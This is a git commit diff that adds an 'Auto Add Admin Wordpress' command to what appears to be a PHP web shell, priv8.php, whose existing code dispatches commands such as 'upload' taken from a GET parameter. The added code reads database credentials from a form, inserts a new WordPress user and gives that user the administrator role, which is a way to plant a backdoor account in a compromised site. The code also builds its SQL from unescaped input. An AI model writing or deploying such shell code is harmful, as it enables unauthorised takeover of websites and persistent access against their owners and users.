3cbd64aa5cc85cfbf961dc1509a2a1a2b9a77a6b
Bang Domath ID <admin@yukinoshita.web.id>
2023-10-14 23:33:44 +0700

    Update priv8.php
    Update Auto Add Admin Wordpress

--- priv8.php
+++ priv8.php
@@ -80,7 +80,57 @@ if (isset($_GET['cmd']) && $_GET['cmd'] === 'upload') {
 }
 if (isset($_GET['cmd']) && $_GET['cmd'] === 'help') {
     echo '<b>About Me: <font color="red">admin@yukinoshita.web.id</font></b>';
-   }
+}
+if (isset($_GET['cmd']) && $_GET['cmd'] === 'add') {
+    echo '<center><h2>Auto Add Admin Wordpress</h2></center>
+    <form method="post" style="text-align:center;"><pre>
+        <label for="db_host">MySQL Host:</label>
+        <input type="text" id="db_host" name="db_host" required><br>
+        <label for="db_name">Database Name:</label>
+        <input type text" id="db_name" name="db_name" required><br>
+        <label for="db_user">MySQL User:</label>
+        <input type="text" id="db_user" name="db_user" required><br>
+        <label for="db_password">MySQL Password:</label>
+        <input type="password" id="db_password" name="db_password" required><br>
+        <label for="table_prefix">Table Prefix:</label>
+        <input type="text" id="table_prefix" name="table_prefix" required><br>
+        <label for="admin_username">Admin Username:</label>
+        <input type="text" id="admin_username" name="admin_username" required><br>
+        <label for="admin_password">Admin Password:</label>
+        <input type="password" id="admin_password" name="admin_password" required><br>
+        <label for="admin_email">Admin Email:</label>
+        <input type="email" id="admin_email" name="admin_email" required><br>
+        <input type="submit" name="setup_admin_user" value="Setup Admin User">
+    </pre></form>';
+    if (isset($_POST["setup_admin_user"])) {
+        $db_host = $_POST["db_host"];
+        $db_name = $_POST["db_name"];
+        $db_user = $_POST["db_user"];
+        $db_password = $_POST["db_password"];
+        $table_prefix = $_POST["table_prefix"];
+        $admin_username = $_POST["admin_username"];
+        $admin_password = $_POST["admin_password"];
+        $admin_email = $_POST["admin_email"];
+        $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
+        if ($mysqli->connect_error) {
+            die("Gagal menghubungkan ke database: ". $mysqli->connect_error);
+        }
+        $admin_password_hash = password_hash($admin_password, PASSWORD_DEFAULT);
+        $query = "INSERT INTO {$table_prefix}users (user_login, user_pass, user_email) VALUES ('$admin_username','$admin_password_hash', '$admin_email')";
+        if ($mysqli->query($query) === true) {
+            $user_id = $mysqli->insert_id;
+            $query = "INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', '{$table_prefix}capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";
+            if ($mysqli->query($query) === true) {
+                echo 'Pengguna admin berhasil dibuat. Berikut informasi login:<br>';
+                echo 'Username: ' . $admin_username . '<br>';
+                echo 'Password: ' . $admin_password . '<br>';
+            } else {
+                echo 'Gagal menambahkan peran administrator: ' . $mysqli->error;
+            }
+        } else {
+            echo 'Gagal membuat pengguna admin: ' . $mysqli->error;
+        }
+        $mysqli->close();
+    }
+}
 ?>
-
-
